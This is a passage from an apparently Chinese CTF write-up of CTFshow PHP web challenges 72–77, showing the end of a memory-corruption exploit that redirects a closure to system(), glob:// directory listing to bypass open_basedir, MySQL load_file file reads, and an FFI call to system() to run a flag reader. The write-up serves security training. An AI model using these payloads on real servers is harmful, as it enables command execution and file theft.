    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>($zif_system <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_system</span>($basic_funcs))) {
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Couldn&#39;t get zif_system address&#34;</span>);
    }


    $fake_obj_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd0</span>;
    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x110</span>; $i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">8</span>) {
        <span style="color:#a6e22e">write</span>($abc, $fake_obj_offset <span style="color:#f92672">+</span> $i, <span style="color:#a6e22e">leak</span>($closure_obj, $i));
    }

    <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0x20</span>, $abc_addr <span style="color:#f92672">+</span> $fake_obj_offset);
    <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0xd0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>);
    <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0xd0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span>, $zif_system);

    ($helper<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">b</span>)($cmd);
    <span style="color:#66d9ef">exit</span>();
}

<span style="color:#a6e22e">ctfshow</span>(<span style="color:#e6db74">&#34;cat /flag0.txt&#34;</span>);<span style="color:#a6e22e">ob_end_flush</span>();
</code></pre></div><h3 id="web7374">web73/74</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span><span style="color:#960050;background-color:#1e0010">	$a=new DirectoryIterator(&#34;glob:///*&#34;);
</span><span style="color:#960050;background-color:#1e0010">foreach($a as $f)
</span><span style="color:#960050;background-color:#1e0010">{echo($f-&gt;__toString().&#39; &#39;);
</span><span style="color:#960050;background-color:#1e0010">}
</span><span style="color:#960050;background-color:#1e0010">exit(0);
</span><span style="color:#960050;background-color:#1e0010">?&gt;
</span><span style="color:#960050;background-color:#1e0010">#查看flag在flagc.txt
</span></code></pre></div><p>payload：c=<code>include('/flagc.txt');exit(0);</code></p>
<h3 id="web76">web76</h3>
<p><strong>知识点</strong>：利用glob://绕过open_basedir限制读取目录。</p>
<p>payload：<code>?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f){echo(&quot; &quot;);echo($f-&gt;__toString().'');}exit(0);?&gt;</code></p>
<p>得到flag36d.txt，然后利用数据库读取文件（前提是知道数据库名称、密码等）</p>
<p>payload：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">try</span> {
    $dbh <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PDO</span>(<span style="color:#e6db74">&#39;mysql:host=localhost;dbname=ctftraining&#39;</span>, <span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;root&#39;</span>);
    <span style="color:#66d9ef">foreach</span>($dbh<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#39;select load_file(&#34;/flag36d.txt&#34;)&#39;</span>) <span style="color:#66d9ef">as</span> $row)
    {
        <span style="color:#66d9ef">echo</span>($row[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;|&#34;</span>; 
    }
    $dbh <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
}
<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">PDOException</span> $e) 
{
    <span style="color:#66d9ef">echo</span> $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>();
    <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>);
}
<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>);

</code></pre></div><h3 id="web77">web77</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14

Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15

Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 24
你要上天吗？ 
</code></pre></div><p>首先查看目录文件：</p>
<p>payload：<code>?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f){echo(&quot; &quot;);echo($f-&gt;__toString().'');}exit(0);?&gt;</code></p>
<p>发现有flag36x.txt、readflag文件，尝试76的数据库读取方法发现不行，联系题目提示php 7.4</p>
<p>payload：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span><span style="color:#960050;background-color:#1e0010">$ffi = FFI::cdef(&#34;int system(char *command);&#34;);$a=&#39;/readflag &gt; /var/www/html/1.txt&#39;;$ffi-&gt;system($a);exit();
</span></code></pre></div><p><code>&gt;</code>在Linux中表示执行readflag中的命令，并把结果储存在根目录的1.txt中。然后直接在url中访问url/1.txt即可。</p>

        </div>

        

        
<br>
<div class="heading">Categories:</div>
<div class="field is-grouped is-grouped-multiline">
  <div class="control">
    <a href="/categories/ctf">
      <span class="tag">C T F</span>
    </a>
  </div>
</div>
<div class="heading">Tags:</div>
<div class="field is-grouped is-grouped-multiline">
  <div class="control">
    <a href="/tags/ctfshow_webrm">
      <span class="tag">C T Fshow W E Brm</span>
    </a>
  </div>
</div>

      </div>

    </section>

    <section class="section">
      
      <div class="container">
  <div class="level">

    <div class="level-left">
      <div class="level-item">
        <p class="control has-addons">
          <a class="button" href="https://hzlhy.github.io/ctf/ctfshow_webrm361_372_ssti/">
            <span class="icon is-small"><i class="fas fa-chevron-left"></i></span>
            <span class="is-hidden-touch is-hidden-desktop-only">
              CTFshow_WEBrm361_372_SSTI
            </span>
            <span class="is-hidden-touch is-hidden-widescreen">
              CTFshow_WEBrm361_372_SSTI
            </span>
            <span class="is-hidden-mobile is-hidden-desktop">
              CTFshow_WEBrm361_372_SSTI
            </span>
            <span class="is-hidden-tablet">
              CTFshow_WEBrm361_372_SSTI
            </span>
            
          </a>
        </p>
      </div>
    </div>

    <div class="level-right">
      <div class="level-item">
        <p class="control has-addons">
          <a class="button" href="#" disabled>
            <span>Oldest</span>
            <span class="icon is-small"><i class="fas fa-chevron-right"></i></span>
          </a>
        </p>
      </div>
    </div>

  </div>
</div>


      <br>

      
      

      <br>

      
      

    </section>

    <footer class="footer">
  <div class="container">
    <nav class="level">

      <div class="level-item has-text-centered">
        <a href="https://hzlhy.github.io/about/" class="heading">
          <span class="header">Abouts</span>
        </a>
      </div><div class="level-item has-text-centered">
        <a href="https://hzlhy.github.io/ctf/" class="heading">
          <span class="header">CTFs</span>
        </a>
      </div>

    </nav>

    <nav class="level">

      <div class="level-left has-text-centered">
        <div class="level-item">
          <form class="control has-icons has-icons-right" method="get"
                action="https://duckduckgo.com">
            <input class="input" type="text" name="q" maxlength="255"
                   placeholder="Search">
            <input class="input" type="hidden" name="sites"
                   value="https://hzlhy.github.io/">
            <span class="icon is-small is-right"><i class="fas fa-search"></i></span>
          </form>
        </div>
      </div>

      <div class="level-right has-text-centered">
        <div class="level-item">

          <a class="button" href="/">
            <span class="icon"><i class="fas fa-home"></i></span>
          </a> &nbsp;

          

          <a class="button"
             href="">
            <span class="icon"><i class="fas fa-rss"></i></span>
          </a>

        </div>
      </div>

    </nav>
  </div>
</footer>

  </body>

</html>
